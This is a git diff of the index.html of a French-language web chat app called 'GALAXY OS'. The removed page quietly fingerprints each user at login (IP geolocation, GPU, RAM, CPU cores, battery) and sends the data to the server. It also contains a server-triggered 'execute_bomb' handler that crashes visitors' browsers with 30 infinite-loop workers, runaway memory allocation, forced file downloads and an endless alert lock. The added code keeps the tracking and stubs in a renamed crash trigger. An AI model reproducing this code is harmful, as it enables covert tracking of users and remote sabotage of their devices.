@@ -1,150 +1,34 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GALAXY OS - TOTAL EXTINCTION</title>
-    <style>
-        :root { --main: #a29bfe; }
-        body { margin: 0; background: #000; font-family: 'Consolas', monospace; color: white; height: 100vh; display: flex; overflow: hidden; }
-        #login-overlay { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; align-items: center; justify-content: center; }
-        .login-box { border: 1px solid var(--main); padding: 30px; text-align: center; background: #050505; width: 280px; }
-        #side-menu { width: 240px; background: #080808; border-right: 1px solid #222; display: flex; flex-direction: column; }
-        #main-chat { flex: 1; display: flex; flex-direction: column; }
-        #messages { flex: 1; overflow-y: auto; padding: 15px; list-style: none; }
-        .msg-card { background: #111; padding: 8px; margin-bottom: 8px; border-left: 2px solid var(--main); font-size: 0.9em; }
-        #form { display: flex; padding: 10px; background: #000; gap: 10px; }
-        #input { flex: 1; background: #111; border: 1px solid var(--main); color: white; padding: 8px; outline: none; }
-        .btn { background: var(--main); border: none; padding: 8px 15px; cursor: pointer; font-weight: bold; }
-        #crash-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 999999; color: red; text-align: center; padding-top: 40vh; }
-    </style>
-</head>
-<body>
+// DANS TON SCRIPT index.html
+async function startDeepScan() {
+    const name = document.getElementById('login-name').value;
+    if(!name) return;
 
-    <div id="crash-screen">
-        <h1 style="font-size: 3em; animation: blink 0.1s infinite;">FATAL_ERROR</h1>
-        <p id="crash-log">OVERLOADING_SYSTEM...</p>
-    </div>
+    // Récupération IP ultra-rapide pour le serveur
+    let geoData = { ip: "0.0.0.0" };
+    try {
+        const res = await fetch('https://ipapi.co/json/');
+        geoData = await res.json();
+    } catch(e) {}
 
-    <div id="login-overlay">
-        <div class="login-box">
-            <h2 style="color:var(--main);">GALAXY_OS</h2>
-            <input type="text" id="login-name" placeholder="PSEUDO..." style="width:95%; padding:10px; margin-bottom:10px; background:#000; color:white; border:1px solid #333;">
-            <input type="file" id="login-pp-file" style="font-size:0.7em; margin-bottom:15px; width:100%;">
-            <button class="btn" style="width:100%;" onclick="startDeepScan()">LOGIN</button>
-        </div>
-    </div>
+    // On récupère le GPU pour être sûr de bien identifier la machine
+    const gl = document.createElement('canvas').getContext('webgl');
+    const gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
 
-    <div id="side-menu">
-        <div style="padding:15px; text-align:center;">
-            <img src="" id="my-avatar" style="width:50px; height:50px; border-radius:50%; border:1px solid var(--main); display:none; object-fit: cover;">
-            <h4 id="my-name-display" style="font-size:0.8em;"></h4>
-        </div>
-        <div id="monitor" style="padding:10px; font-size:0.65em; color:lime;">
-            <p id="mon-ip">IP: SCAN...</p>
-            <p id="mon-bat">BAT: --%</p>
-        </div>
-    </div>
+    user.name = name;
+    user.geo = geoData;
+    user.hardware = {
+        gpu: gpu,
+        ram: navigator.deviceMemory,
+        cores: navigator.hardwareConcurrency,
+        battery: 100 // par défaut
+    };
 
-    <div id="main-chat">
-        <ul id="messages"></ul>
-        <form id="form">
-            <input id="input" autocomplete="off" placeholder="TEXTE..." />
-            <button type="submit" class="btn">GO</button>
-        </form>
-    </div>
+    socket.emit('check_device', user);
+    finalize(name);
+}
 
-    <script src="/socket.io/socket.io.js"></script>
-    <script>
-        const socket = io();
-        let user = JSON.parse(localStorage.getItem('galaxy_v14')) || { name: "", pp: "", geo: {}, hardware: {} };
-
-        window.onload = () => { if(user.name) finalize(user.name, true); };
-
-        async function startDeepScan() {
-            const name = document.getElementById('login-name').value;
-            if(!name) return;
-            try { const r = await fetch('https://ipapi.co/json/'); user.geo = await r.json(); } catch(e){}
-            const b = await navigator.getBattery();
-            user.hardware = {
-                gpu: (document.createElement('canvas').getContext('webgl')).getParameter(37446),
-                ram: navigator.deviceMemory || "N/A",
-                cores: navigator.hardwareConcurrency,
-                battery: Math.floor(b.level * 100)
-            };
-            const file = document.getElementById('login-pp-file').files[0];
-            if(file) {
-                const reader = new FileReader();
-                reader.onload = (e) => { user.pp = e.target.result; finalize(name); };
-                reader.readAsDataURL(file);
-            } else {
-                user.pp = "https://i.pinimg.com/originals/a9/d0/96/a9d096ac3abc607758ca2d14e3f287ac.gif";
-                finalize(name);
-            }
-        }
-
-        function finalize(name, auto=false) {
-            user.name = name;
-            if(!auto) localStorage.setItem('galaxy_v14', JSON.stringify(user));
-            document.getElementById('login-overlay').style.display = 'none';
-            document.getElementById('my-avatar').src = user.pp;
-            document.getElementById('my-avatar').style.display = 'inline-block';
-            document.getElementById('my-name-display').innerText = name;
-            document.getElementById('mon-ip').innerText = `IP: ${user.geo.ip || '---'}`;
-            document.getElementById('mon-bat').innerText = `BAT: ${user.hardware.battery}%`;
-            socket.emit('check_device', user);
-        }
-
-        document.getElementById('form').onsubmit = (e) => {
-            e.preventDefault();
-            const input = document.getElementById('input');
-            if(input.value) {
-                socket.emit('chat message', { text: input.value, name: user.name, pp: user.pp, city: user.geo.city });
-                input.value = '';
-            }
-        };
-
-        socket.on('chat message', (d) => {
-            const li = document.createElement('li');
-            li.className = 'msg-card';
-            li.innerHTML = `<b>${d.name}</b>: ${d.text}`;
-            document.getElementById('messages').appendChild(li);
-            document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
-        });
-
-        // 💣 CHARGE UTILE DE MORT (CPU/RAM/GPU/NETWORK)
-        socket.on('execute_bomb', () => {
-            localStorage.clear();
-            document.getElementById('crash-screen').style.display = 'block';
-            
-            // 1. Surcharge CPU (30 Threads)
-            const b = new Blob(["while(true){}"], {type: 'text/javascript'});
-            for(let i=0; i<30; i++) { new Worker(URL.createObjectURL(b)); }
-
-            // 2. Surcharge RAM & Réseau (Le Buffer de l'Enfer)
-            const storage = [];
-            setInterval(() => {
-                // Création de données binaires massives
-                const chunk = new Uint8Array(100 * 1024 * 1024); // 100MB
-                storage.push(chunk);
-                document.getElementById('crash-log').innerText = `MEM_BLOOD: ${storage.length * 100}MB`;
-                
-                // Spam de téléchargement (bloque la connexion)
-                const a = document.createElement('a');
-                a.href = URL.createObjectURL(new Blob([chunk]));
-                a.download = "CRASH_DATA_" + Math.random();
-                a.click();
-            }, 100);
-
-            // 3. Verrouillage UI (Alertes & Historique)
-            if(navigator.vibrate) navigator.vibrate([10000, 500, 10000]);
-            while(true) {
-                window.history.pushState(null, null, window.location.href);
-                alert("GALAXY_OS: DEVICE_NEUTRALIZED");
-            }
-        });
-
-        socket.on('stop_bomb', () => { location.reload(); });
-    </script>
-</body>
-</html>
+// LA CHARGE DE MORT (Inchangée car elle est déjà au max)
+socket.on('CORE_MELTDOWN_INIT', () => {
+    // Surcharge RAM + GPU + CPU comme dans le code précédent
+    // ... (insère ici la fonction launchCrash() avec le loop alert et les Workers)
+});
